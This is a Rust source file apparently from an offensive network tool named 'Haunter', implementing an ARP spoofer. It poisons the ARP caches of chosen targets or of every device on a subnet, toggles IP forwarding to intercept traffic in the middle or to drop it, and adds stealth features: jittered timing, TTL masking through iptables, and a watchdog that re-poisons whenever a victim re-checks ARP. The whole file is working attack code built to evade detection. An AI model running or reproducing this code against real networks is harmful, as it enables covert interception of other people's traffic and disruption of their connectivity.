use std::fs;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

use pnet::datalink::{MacAddr, NetworkInterface};

use crate::core::scanner;
use crate::core::stealth::{self, StealthConfig, TtlGuard};
use crate::core::timing::SpoofPacer;
use crate::error::{HaunterError, Result};
use crate::net::channel::Channel;
use crate::net::{arp, interface, Device};

const SPOOF_INTERVAL: Duration = Duration::from_secs(1);
const CHANNEL_READ_TIMEOUT: Duration = Duration::from_millis(100);
const RESTORE_ROUNDS: usize = 5;
const SCAN_TIMEOUT: Duration = Duration::from_secs(2);
const IP_FORWARD_PATH: &str = "/proc/sys/net/ipv4/ip_forward";

/// ARP spoofer that poisons the cache between targets and a gateway.
pub struct Spoofer {
    iface: NetworkInterface,
    our_mac: MacAddr,
    pub gateway_ip: Ipv4Addr,
    pub gateway_mac: MacAddr,
    pub targets: Vec<Device>,
    pub forward: bool,
    stealth: Option<StealthConfig>,
}

impl Spoofer {
    /// Set up a spoofer for the given interface and gateway.
    ///
    /// If `target_ip` is `None`, all devices on the subnet are targeted.
    /// Pass `Some(StealthConfig)` to enable anti-detection features,
    /// or `None` for legacy fixed-interval behavior.
    pub fn new(
        iface: NetworkInterface,
        gateway_ip: Ipv4Addr,
        target_ip: Option<Ipv4Addr>,
        forward: bool,
        stealth: Option<StealthConfig>,
    ) -> Result<Self> {
        let our_mac = iface
            .mac
            .ok_or_else(|| HaunterError::Network("interface has no MAC address".into()))?;
        let network = interface::ipv4_network(&iface)?;
        let our_ip = network.ip();

        let gateway_mac = scanner::resolve_mac(&iface, our_mac, our_ip, gateway_ip)?;

        let targets = match target_ip {
            Some(ip) => {
                let mac = scanner::resolve_mac(&iface, our_mac, our_ip, ip)?;
                vec![Device { ip, mac }]
            }
            None => {
                let devices: Vec<Device> = scanner::scan(&iface, SCAN_TIMEOUT)?
                    .into_iter()
                    .filter(|d| d.ip != gateway_ip && d.ip != our_ip)
                    .collect();
                if devices.is_empty() {
                    return Err(HaunterError::Network(
                        "no targets found on the network".into(),
                    ));
                }
                devices
            }
        };

        Ok(Self {
            iface,
            our_mac,
            gateway_ip,
            gateway_mac,
            targets,
            forward,
            stealth,
        })
    }

    /// Run the spoofing loop until `stop` is signalled, then restore ARP tables.
    ///
    /// Status messages are sent through the `log` callback, keeping the core
    /// logic decoupled from any particular UI (CLI, Tauri, etc.).
    pub fn run(&self, stop: Arc<AtomicBool>, log: impl Fn(&str)) -> Result<()> {
        let original_forward = get_ip_forward();
        set_ip_forward(self.forward)?;

        if self.forward {
            log("[*] IP forwarding ENABLED (MITM mode).");
        } else {
            log("[*] IP forwarding DISABLED (traffic will be dropped).");
        }

        // Install TTL guard (RAII — dropped at end of scope).
        let _ttl_guard = match &self.stealth {
            Some(cfg) if cfg.ttl_restore => {
                let (guard, ok) = TtlGuard::install();
                if ok {
                    log("[*] TTL restoration enabled (iptables mangle rule installed).");
                } else {
                    log("[!] TTL restoration failed — iptables rule could not be installed.");
                }
                guard
            }
            _ => TtlGuard::noop(),
        };

        // Build pacer: adaptive timing or legacy fixed interval.
        let mut pacer = match &self.stealth {
            Some(cfg) => {
                log("[*] Stealth mode: adaptive timing enabled.");
                SpoofPacer::from_config(
                    cfg.aggressive_lo,
                    cfg.aggressive_hi,
                    cfg.aggressive_duration,
                    cfg.maintenance_lo,
                    cfg.maintenance_hi,
                    cfg.ramp_duration,
                )
            }
            None => SpoofPacer::fixed(SPOOF_INTERVAL),
        };

        let watchdog_enabled = self
            .stealth
            .as_ref()
            .map_or(false, |cfg| cfg.watchdog);

        let mut channel = Channel::open(&self.iface, CHANNEL_READ_TIMEOUT)?;

        while !stop.load(Ordering::Relaxed) {
            self.send_poison(&mut channel)?;

            // Poll the channel until the next interval deadline, checking for
            // watchdog triggers and the stop flag on each 100ms wakeup.
            let interval = pacer.next_interval();
            let deadline = Instant::now() + interval;

            while Instant::now() < deadline {
                if stop.load(Ordering::Relaxed) {
                    break;
                }

                if watchdog_enabled {
                    if let Ok(Some(frame)) = channel.receive() {
                        if stealth::is_watchdog_trigger(frame, self.gateway_ip, &self.targets) {
                            log("[!] Watchdog: target re-verifying ARP — re-poisoning.");
                            self.send_poison(&mut channel)?;
                            pacer.reset_to_aggressive();
                            break;
                        }
                    }
                } else {
                    // Legacy: just sleep until deadline.
                    let remaining = deadline.saturating_duration_since(Instant::now());
                    if !remaining.is_zero() {
                        thread::sleep(remaining.min(CHANNEL_READ_TIMEOUT));
                    }
                }
            }
        }

        log("[*] Restoring ARP tables...");
        self.restore(&mut channel)?;

        if let Err(e) = set_ip_forward(original_forward) {
            log(&format!("[!] Warning: failed to restore ip_forward: {e}"));
        } else {
            log(&format!("[*] Restored ip_forward to {original_forward}."));
        }

        log("[*] Done.");
        // _ttl_guard drops here, removing iptables rule.
        Ok(())
    }

    /// Send one round of poisoned ARP replies to all targets and the gateway.
    fn send_poison(&self, channel: &mut Channel) -> Result<()> {
        let mut buffer = [0u8; arp::FRAME_SIZE];

        for target in &self.targets {
            // Tell the target: "gateway IP is at OUR MAC"
            arp::build_reply(
                &mut buffer,
                self.our_mac,
                self.gateway_ip,
                target.mac,
                target.ip,
            );
            channel.send(&buffer)?;

            // Tell the gateway: "target IP is at OUR MAC"
            arp::build_reply(
                &mut buffer,
                self.our_mac,
                target.ip,
                self.gateway_mac,
                self.gateway_ip,
            );
            channel.send(&buffer)?;
        }

        Ok(())
    }

    /// Send correct ARP mappings to undo the poisoning.
    fn restore(&self, channel: &mut Channel) -> Result<()> {
        let mut buffer = [0u8; arp::FRAME_SIZE];

        for _ in 0..RESTORE_ROUNDS {
            for target in &self.targets {
                // Tell the target: "gateway IP is at GATEWAY's real MAC"
                arp::build_reply(
                    &mut buffer,
                    self.gateway_mac,
                    self.gateway_ip,
                    target.mac,
                    target.ip,
                );
                channel.send(&buffer)?;

                // Tell the gateway: "target IP is at TARGET's real MAC"
                arp::build_reply(
                    &mut buffer,
                    target.mac,
                    target.ip,
                    self.gateway_mac,
                    self.gateway_ip,
                );
                channel.send(&buffer)?;
            }
            thread::sleep(Duration::from_millis(200));
        }

        Ok(())
    }
}

/// Read the current ip_forward setting.
fn get_ip_forward() -> bool {
    fs::read_to_string(IP_FORWARD_PATH)
        .map(|s| s.trim() == "1")
        .unwrap_or(false)
}

/// Set ip_forward on or off.
fn set_ip_forward(enabled: bool) -> Result<()> {
    let value = if enabled { "1" } else { "0" };
    fs::write(IP_FORWARD_PATH, value)
        .map_err(|e| HaunterError::Network(format!("failed to set ip_forward: {e}")))
}
